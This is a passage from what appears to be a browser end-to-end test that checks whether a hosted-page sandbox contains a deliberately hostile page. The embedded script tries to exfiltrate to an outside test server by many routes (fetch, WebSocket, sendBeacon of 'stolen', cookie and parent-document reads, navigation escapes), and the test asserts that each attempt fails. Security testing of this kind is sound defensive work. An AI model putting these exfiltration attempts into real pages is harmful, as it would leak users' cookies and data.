  await attempt("otherPageRelative", () => fetch("../" + config.otherToken + "/index.html").then((answer) => answer.text()));
  await attempt("outsideFetch", () => fetch(config.outside + "/fetch").then((answer) => answer.text()));
  await attempt("outsideXhr", () => new Promise((resolve, reject) => {
    const request = new XMLHttpRequest();
    request.open("GET", config.outside + "/xhr");
    request.onload = () => resolve(request.status);
    request.onerror = () => reject(new Error("xhr-error"));
    request.send();
  }));
  await attempt("outsideImage", () => load("img", config.outside + "/image.png"));
  await attempt("outsideScript", () => load("script", config.outside + "/script.js"));
  await attempt("outsideStyle", () => load("link", config.outside + "/style.css"));
  await attempt("otherPageFrame", () => load("iframe", config.otherPage));
  await attempt("outsideWebSocket", () => opened(() => new WebSocket(config.outsideWs + "/ws")));
  await attempt("outsideEventSource", () => opened(() => new EventSource(config.outside + "/events")));
  await attempt("worker", () => new Promise((resolve, reject) => { const worker = new Worker("data.json"); worker.onerror = () => reject(new Error("worker-error")); setTimeout(() => resolve("started"), 1000); }));
  await attempt("serviceWorker", () => navigator.serviceWorker.register("data.json").then(() => "registered"));
  await attempt("popup", () => String(window.open(config.outside + "/popup")));
  await attempt("beacon", () => navigator.sendBeacon(config.outside + "/beacon", "stolen"));
  await attempt("prefetch", () => { const link = document.createElement("link"); link.rel = "prefetch"; link.href = config.outside + "/prefetch"; document.head.append(link); return "added"; });
  await attempt("cssBackground", () => { const box = document.createElement("div"); box.style.backgroundImage = "url(" + config.outside + "/background.png)"; box.style.width = box.style.height = "4px"; document.body.append(box); return "added"; });
  await new Promise((resolve) => setTimeout(resolve, 500));
  results.violations = violations;
  document.getElementById("results").textContent = JSON.stringify(results);
  document.body.dataset.done = "yes";
})();
// Navigations end the page, so the test starts them once it has read the results.
window.tryEscapes = () => {
  try { top.location.href = config.outside + "/top"; } catch {}
  for (const target of ["_blank", "_top"]) {
    const link = document.createElement("a");
    link.href = config.outside + "/link" + target;
    link.target = target;
    document.body.append(link);
    link.click();
  }
  document.getElementById("escape").submit();
  setTimeout(() => { location.href = config.outside + "/self"; }, 200);
};
`
      });
      const hostile = await world.publish("hostile");
      await context.addCookies([{ name: "vibe64_session", value: "secret-session-cookie", url: world.origin, httpOnly: false, sameSite: "Lax" }]);
      // Chromium reports a request it blocked by policy as a failed request; only an answered one got out.
      const browserRequests: string[] = [];
      const blocked: string[] = [];
      const reachedOut = (url: string) => url.startsWith(outside.url) || url.startsWith(outside.url.replace("http", "ws"))
        || url.includes("from=hostile") || url.includes(String(otherToken));
      context.on("requestfinished", (request) => { if (reachedOut(request.url())) browserRequests.push(request.url()); });
      context.on("requestfailed", (request) => { if (reachedOut(request.url())) blocked.push(`${request.url()} ${request.failure()?.errorText}`); });
      context.on("page", (opened) => opened.on("websocket", (socket) => { if (reachedOut(socket.url())) browserRequests.push(socket.url()); }));
      page.on("websocket", (socket) => { if (reachedOut(socket.url())) browserRequests.push(socket.url()); });

      const expectContained = async (target: Page, label: string) => {
        await expect.poll(() => filesFrame(target)?.locator("body").getAttribute("data-done"), { timeout: 30_000 }).toBe("yes");
        const frame = filesFrame(target)!;
        const results = JSON.parse(await frame.locator("#results").textContent() || "{}");
        console.log(`hostile page ${label}: ${JSON.stringify(results)}`);
        expect(results.ownFile, "the page's own files still load").toEqual({ reached: true, value: "{\"own\":true}" });
        for (const name of ["cookie", "localStorage", "parentDocument", "parentCookie", "topDocument", "topLocation", "vibe64Api", "vibe64ApiAbsolute",
          "vibe64Session", "vibe64OtherPort", "otherPageFile", "otherPageRelative", "outsideFetch", "outsideXhr", "outsideImage", "outsideScript",
          "outsideStyle", "outsideWebSocket", "outsideEventSource", "worker", "serviceWorker"]) {
          expect(results[name]?.reached, `${label}: ${name} ${JSON.stringify(results[name])}`).toBe(false);
        }
        expect(results.popup, `${label}: popup`).toEqual({ reached: true, value: "null" });
        expect(JSON.stringify(results)).not.toContain("secret-session-cookie");
        expect(JSON.stringify(results)).not.toContain("Other page secret");
        await frame.evaluate(() => (window as unknown as { tryEscapes: () => void }).tryEscapes());
        await target.waitForTimeout(2_500);
        expect(outside.hits, `${label}: nothing reached the outside`).toEqual([]);
        expect(browserRequests, `${label}: the browser got no answer from outside the page's files`).toEqual([]);
        console.log(`blocked requests ${label}: ${blocked.splice(0).join(" | ")}`);
      };

      await page.goto(`${world.origin}${hostile.link}`);
      await expect(page.locator('[data-test="page-viewer-title"]')).toHaveText("Harmless chart");
      await expectContained(page, "beside the chat");
      await expect(page).toHaveURL(new RegExp(`${hostile.link}$`, "u"));
      await expect(page.locator('[data-test="page-viewer-frame"]')).toBeVisible();
      await page.screenshot({ path: testInfo.outputPath("hostile-page-contained.png") });

      await page.getByRole("button", { name: "Reload page" }).click();
      const [tab] = await Promise.all([context.waitForEvent("page"), page.locator('[data-test="page-open-new-tab"]').click()]);
      await tab.waitForURL(/\/api\/vibe64\/pages\/view\/[A-Za-z0-9_-]{43}$/u);
      const tabUrl = tab.url();
      await expectContained(tab, "in its own tab");
      expect(tab.url()).toBe(tabUrl);
      await tab.close();
      expect(context.pages()).toHaveLength(1);
      expect.soft(world.fileRequests.filter((entry) => entry.cookie.includes("secret-session-cookie")), "page file requests carry no Vibe64 cookie").toEqual([]);
    } finally {
      outside.close();
    }
  });
});
